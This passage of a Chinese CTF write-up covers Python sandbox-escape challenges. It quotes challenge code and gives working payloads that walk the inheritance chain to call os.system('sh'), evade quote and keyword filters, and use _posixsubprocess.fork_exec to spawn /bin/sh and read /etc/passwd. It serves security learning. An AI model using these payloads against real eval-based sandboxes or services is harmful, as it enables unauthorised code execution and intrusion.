<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>

<p>限制长度为7，前面一道题的函数用不了了，再尝试一下<code>help()</code></p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601211200702.png" alt="image-20240601211200702"></p>
<p>这里又可以用了。可能是环境问题或者题目设置的吧吧。多试试，这里成功得到flag。</p>
<h3 id="calc-jail-beginner-level2-5-JAIL"><a href="#calc-jail-beginner-level2-5-JAIL" class="headerlink" title="calc_jail_beginner_level2.5(JAIL)"></a>calc_jail_beginner_level2.5(JAIL)</h3><p>关键源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">——————</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">filter</span>(input_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>

<p>使用<code>breakpoint()</code>，如下：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601212002612.png" alt="image-20240601212002612"></p>
<h3 id="calc-jail-beginner-level5-JAIL"><a href="#calc-jail-beginner-level5-JAIL" class="headerlink" title="calc_jail_beginner_level5(JAIL)"></a>calc_jail_beginner_level5(JAIL)</h3><p>没给附件，开题显示：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601212548989.png" alt="image-20240601212548989"></p>
<p>dir()说明：</p>
<p><strong>dir()</strong> 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表</p>
<p>看看dir()的结果</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214137053.png" alt="image-20240601214137053"></p>
<p>再看看<code>my_flag</code>的属性：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214233949.png" alt="image-20240601214233949"></p>
<p>这里看到一个flag_level5，尝试读取，</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214345028.png" alt="image-20240601214345028"></p>
<p>显示被删除了，再看看这个flag_level5的属性呢</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214515679.png" alt="image-20240601214515679"></p>
<p>这里有个encode，一般encode()都与字符串相关，尝试读取</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601220055100.png" alt="image-20240601220055100"></p>
<p><strong>同时注意</strong>，这道题可以直接用<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>，打，对于ctf要保持这种思想，多思考源码可能得部分，<strong>但是这里的考点还是需要掌握</strong>。使用这个方法看看源码：<br>load_flag.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">secert_flag</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;DELETED&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;DELETED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">flag_level5</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, flag: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="built_in">setattr</span>(self, <span class="string">&#x27;flag_level5&#x27;</span>, secert_flag(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> flag_level5(f.read())</span><br></pre></td></tr></table></figure>

<p>server.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#It&#x27;s an challenge for jaillevel5 let&#x27;s read your flag!</span></span><br><span class="line"><span class="keyword">import</span> load_flag</span><br><span class="line"></span><br><span class="line">flag = load_flag.get_flag()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   </span><br><span class="line">    repl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    my_global_dict = <span class="built_in">dict</span>()</span><br><span class="line">    my_global_dict[<span class="string">&#x27;my_flag&#x27;</span>] = flag</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = <span class="built_in">compile</span>(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(complie_code, my_global_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>代码中的 <code>secert_flag</code> 类是一个 <code>str</code> 类型的子类。在这个子类中，<code>__repr__()</code> 和 <code>__str__()</code> 方法都被改写为返回 “DELETED”，这两个方法在 Python 中用于获取对象的字符串表示。</p>
<p>那么，什么是 <code>__repr__</code> 和 <code>__str__</code> 方法？</p>
<ol>
<li><code>__repr__</code> 方法返回一个表达式字符串，当这个字符串经过 <code>eval()</code> 函数求值时，可以重新得到这个对象。它的目标是准确性。这个方法在你直接打印一个对象、调用 <code>repr()</code> 函数时会被调用。</li>
<li><code>__str__</code> 方法返回一个对象的文本表示。这个方法的目标是可读性。在 <code>print()</code> 函数和 <code>str()</code> 函数中会用到。</li>
</ol>
<p>当你打印一个 <code>secert_flag</code> 对象或调用 <code>str()</code> 或者 <code>repr()</code> 函数 on <code>secert_flag</code> 对象时，Python 因此返回 “DELETED”。</p>
<p>而当你调用 <code>.encode()</code> 方法时，Python 将字符串对象转换为原始的字节字符串表示。<code>.encode()</code> 方法不调用 <code>__str__</code> 或 <code>__repr__</code>，因此，它能够显示出被 <code>__str__</code> 和 <code>__repr__</code> 方法隐藏的原始字符串内容，这就是你看到的 flag。</p>
<p><strong>这一点体现出了 Python 的面向对象特性 —— 你可以通过子类覆盖父类的方法来改变对象的行为。在这个 CTF 挑战中，这个特性被用来隐藏 flag。</strong></p>
<h3 id="calc-jail-beginner-level4-JAIL"><a href="#calc-jail-beginner-level4-JAIL" class="headerlink" title="calc_jail_beginner_level4(JAIL)"></a>calc_jail_beginner_level4(JAIL)</h3><p>关键代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">————————    </span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eval_func(input_data)))</span><br></pre></td></tr></table></figure>

<p>删除了几个函数，并且有黑名单：<code>&quot;</code>、<code>&#39;</code>、<code>反引号</code>。</p>
<p>由于这里删除了<code>__Import__</code>函数，所以不能导入模块，看了一下笔记，这里尝试使用继承链。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602010131729.png" alt="image-20240602010131729"></p>
<p>这里知道了os模块在倒数第四个，想要构造的payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后这里过滤了引号，可以使用<code>bytes()</code>函数或<code>__doc__</code>，如下构造：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">56</span>])</span><br></pre></td></tr></table></figure>

<p>成功执行：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602012213510.png" alt="image-20240602012213510"></p>
<p>对于上面的payload，只用其中一种函数就行，这里只是为了将可利用的表达式给出来，对于<code>__doc__</code>可以先本地跑出来数字再传参，实在不行在题目环境跑，只不过同样需要绕过等号。</p>
<h3 id="calc-jail-beginner-level4-0-5-JAIL"><a href="#calc-jail-beginner-level4-0-5-JAIL" class="headerlink" title="calc_jail_beginner_level4.0.5(JAIL)"></a>calc_jail_beginner_level4.0.5(JAIL)</h3><p>没给附件。开题显示：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602100727394.png" alt="image-20240602100727394"></p>
<p>这里给了禁了的东西。</p>
<p>尝试直接的文件，猜测为当前目录的<code>flag</code>文件，如下构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(open(list(dict(flag=1))[0]).read())</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602101029115.png" alt="image-20240602101029115"></p>
<p>成功得到。</p>
<p>那么现在来尝试读取不读文件，还是尝试使用继承链，可以直接使用上一道题的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>

<p>成功：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602101302869.png" alt="image-20240602101302869"></p>
<h3 id="calc-jail-beginner-level5-1-JAIL"><a href="#calc-jail-beginner-level5-1-JAIL" class="headerlink" title="calc_jail_beginner_level5.1(JAIL)"></a>calc_jail_beginner_level5.1(JAIL)</h3><p>无附件，开题：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602105212292.png" alt="image-20240602105212292"></p>
<p>?，怎么又是这个，还是先不拘泥于这个，尝试直接导入，好吧，尝试过后应该是import被删了，那么尝试之前的方法，过程一样，成功：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602110047376.png" alt="image-20240602110047376"></p>
<p>但是在尝试的时候题目禁止了print()、help()等内置函数，却可以使用dir()内置函数，应该是题目设置的。</p>
<h3 id="calc-jail-beginner-level4-1-JAIL"><a href="#calc-jail-beginner-level4-1-JAIL" class="headerlink" title="calc_jail_beginner_level4.1(JAIL)"></a>calc_jail_beginner_level4.1(JAIL)</h3><p>题目无附件，开题：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602110456229.png" alt="image-20240602110456229"></p>
<p>还是用继承链打，这里使用<code>__doc__</code>，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"><span class="comment">#同样还是倒数第四个</span></span><br></pre></td></tr></table></figure>

<p>绕引号，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602111916342.png" alt="image-20240602111916342"></p>
<p>得到flag。</p>
<p>从其他地方学到的一个做题技巧，由于<code>bytes()</code>是内置函数，所以我们可以在<code>object</code>类中看到它，<br>本地来测试，等下直接给payload打题。</p>
<p>测试代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c= <span class="string">&#x27;().__class__.__base__.__subclasses__()&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(c))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602122042032.png" alt="image-20240602122042032"></p>
<p>这里可以看到<code>bytes</code>在第7个，尝试引用它：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[6]</span><br></pre></td></tr></table></figure>

<p>此时再结合利用<code>bytes()</code>函数绕过引号起来看看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&#x27;().__class__.__base__.__subclasses__()[6]([108,115]).decode()&#x27;</span>))</span><br><span class="line"><span class="comment">#ls</span></span><br></pre></td></tr></table></figure>

<p>成功得到ls，那么再构造一下上面的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system</span></span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>]).decode()</span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">104</span>]).decode()</span><br><span class="line"><span class="comment">#再如下构造：</span></span><br><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602123430218.png" alt="image-20240602123430218"></p>
<p>成功执行。<strong>对于第二种这样直接找内置函数的方法还是比较<u>重要</u>，掌握</strong>。</p>
<h3 id="calc-jail-beginner-level4-3-JAIL"><a href="#calc-jail-beginner-level4-3-JAIL" class="headerlink" title="calc_jail_beginner_level4.3(JAIL)"></a>calc_jail_beginner_level4.3(JAIL)</h3><p>无附件，开题：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602123622080.png" alt="image-20240602123622080"></p>
<p>多过滤了一个<code>+</code>号，可以直接用上一道题的第二个方法的payload打：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602123847401.png" alt="image-20240602123847401"></p>
<p><strong>还可以使用笔记里面的<code>join()</code>来打：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">测试一下：</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;str().join([().__doc__[19],().__doc__[23]])&quot;</span>))</span><br><span class="line"><span class="comment">#成功得到se</span></span><br></pre></td></tr></table></figure>

<p>那么现在就开始构造：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system </span></span><br><span class="line"><span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])</span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line"><span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]])</span><br><span class="line"><span class="comment">#再最后构造</span></span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>

<p>成功执行：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602130242008.png" alt="image-20240602130242008"></p>
<h3 id="calc-jail-beginner-level4-2-JAIL"><a href="#calc-jail-beginner-level4-2-JAIL" class="headerlink" title="calc_jail_beginner_level4.2(JAIL)"></a>calc_jail_beginner_level4.2(JAIL)</h3><p>无附件，开题：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602135137862.png" alt="image-20240602135137862"></p>
<p>直接用上一道题的两种payload都能打</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602135448221.png" alt="image-20240602135448221"></p>
<h3 id="calc-jail-beginner-level6-JAIL"><a href="#calc-jail-beginner-level6-JAIL" class="headerlink" title="calc_jail_beginner_level6(JAIL)"></a>calc_jail_beginner_level6(JAIL)</h3><p>无附件，但开题的时候给了部分源码：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602135618416.png" alt="image-20240602135618416"></p>
<p>这是基于audit hook的沙箱，开了一个白名单，使用<code>_posixsubprocess</code>模块 执行命令，使用笔记上的</p>
<p>payload，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144311501.png" alt="image-20240602144311501"></p>
<p>成功读取，那么现在将其改为sh交互模式的payload，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144457799.png" alt="image-20240602144457799"></p>
<h3 id="calc-jail-beginner-level7-JAIL"><a href="#calc-jail-beginner-level7-JAIL" class="headerlink" title="calc_jail_beginner_level7(JAIL)"></a>calc_jail_beginner_level7(JAIL)</h3><p>无附件，开题：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144750895.png" alt="image-20240602144750895"></p>
<p>黑名单：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144818902.png" alt="image-20240602144818902"></p>
<p>禁止了Call、import，等，导致不能调用函数和导入模块，尝试使用装饰器，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@exec</span><br><span class="line">@input</span><br><span class="line">class X:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>成功执行：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602145323415.png" alt="image-20240602145323415"></p>
<h3 id="calc-jail-beginner-level6-1-JAIL"><a href="#calc-jail-beginner-level6-1-JAIL" class="headerlink" title="calc_jail_beginner_level6.1(JAIL)"></a>calc_jail_beginner_level6.1(JAIL)</h3><p>无附件，开题：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602145513470.png" alt="image-20240602145513470"></p>
<p>好像没有什么变化，继续使用level6的payload，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602150652172.png" alt="image-20240602150652172"></p>
<p>这里尝试进入sh模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602150803916.png" alt="image-20240602150803916"></p>
<p>连上后马上又断了，但是既然直接读有回回显，那么直接一条一条命令来执行，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/ls&quot;], [b&quot;/bin/ls&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602150932540.png" alt="image-20240602150932540"></p>
<p>直接读flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p>成功得到：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602151022629.png" alt="image-20240602151022629"></p>
<p>看了一下其他师傅的做法，这里连上会断，可以尝试使用无限迭代器<code>itertools</code>，这是一个内建模块,不过在这里不能达到无限，需要拼手速发进去<code>cat flag</code>，注意下面这个方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[os := __import__(&#x27;os&#x27;), itertools := __loader__.load_module(&#x27;itertools&#x27;), _posixsubprocess := __loader__.load_module(&#x27;_posixsubprocess&#x27;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]</span><br></pre></td></tr></table></figure>

<p><strong>这里主要学习一下海象表达式的格式的利用以及无限迭代器的使用</strong></p>
<h3 id="lake-lake-lake-JAIL"><a href="#lake-lake-lake-JAIL" class="headerlink" title="lake lake lake(JAIL)"></a>lake lake lake(JAIL)</h3><p>有附件，关键源码：</p>
